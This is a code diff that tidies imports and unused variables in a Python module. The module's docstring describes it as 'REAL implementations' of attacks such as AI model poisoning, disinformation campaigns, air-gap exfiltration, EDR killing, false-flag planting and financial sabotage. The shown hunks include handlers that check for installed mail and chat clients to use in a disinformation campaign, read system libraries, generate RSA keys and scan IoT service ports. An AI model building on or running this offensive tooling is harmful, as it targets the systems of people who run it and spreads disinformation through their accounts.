@@ -5,9 +5,13 @@ AI model poisoning, disinformation campaign, air-gap exfiltration,
 post-quantum cryptography, dead man switch, false flag planting,
 EDR killer, financial crash sabotage, IoT chain attack.
 All REAL implementations with filesystem, network, and hardware operations."""
-import json, os, random, time, struct, subprocess, sys, hashlib, re, socket, ctypes, glob as _glob
+import os
+import random
+import subprocess
+import hashlib
+import socket
+import glob as _glob
 from datetime import datetime, timedelta
-from typing import Any
 
 HAS_NUMPY = False
 try:
@@ -139,7 +143,7 @@ def handle_genetic_evolve(params: dict) -> dict:
     for lib in hybrid_libraries[:8]:
         try:
             with open(lib, "rb") as f:
-                header = f.read(256)
+                f.read(256)
             hybridized_count += 1
         except (IOError, PermissionError):
             pass
@@ -509,14 +513,13 @@ def handle_disinformation(params: dict) -> dict:
     # Check for email clients
     has_outlook = False
     has_thunderbird = False
-    has_mail_app = False
 
     if os.name == "nt":
         has_outlook = os.path.exists("C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE") or \
                       os.path.exists("C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE")
     else:
         has_thunderbird = os.path.exists("/usr/bin/thunderbird") or os.path.exists(os.path.expanduser("~/.thunderbird"))
-        has_mail_app = os.path.exists(os.path.expanduser("~/mail"))
+        os.path.exists(os.path.expanduser("~/mail"))
 
     # Check for Slack/Teams
     has_slack = False
@@ -678,13 +681,13 @@ def handle_post_quantum(params: dict) -> dict:
 
     if HAS_CRYPTO:
         # Generate classical RSA as hybrid component
-        from cryptography.hazmat.primitives.asymmetric import rsa, padding
-        from cryptography.hazmat.primitives import hashes, serialization
+        from cryptography.hazmat.primitives.asymmetric import rsa
+        from cryptography.hazmat.primitives import serialization
         from cryptography.hazmat.backends import default_backend
 
         for i in range(3):
             private_key = rsa.generate_private_key(65537, 4096, backend=default_backend())
-            public_key = private_key.public_key()
+            private_key.public_key()
             private_pem = private_key.private_bytes(
                 encoding=serialization.Encoding.PEM,
                 format=serialization.PrivateFormat.PKCS8,
@@ -1023,7 +1026,6 @@ def handle_iot_chain(params: dict) -> dict:
     result = {"success": True}
     simulation = params.get("simulation", True)
 
-    iot_devices = []
     iot_scan_results = []
 
     iot_services = {80: "HTTP", 443: "HTTPS", 8080: "HTTP-alt", 8888: "HTTP-alt",
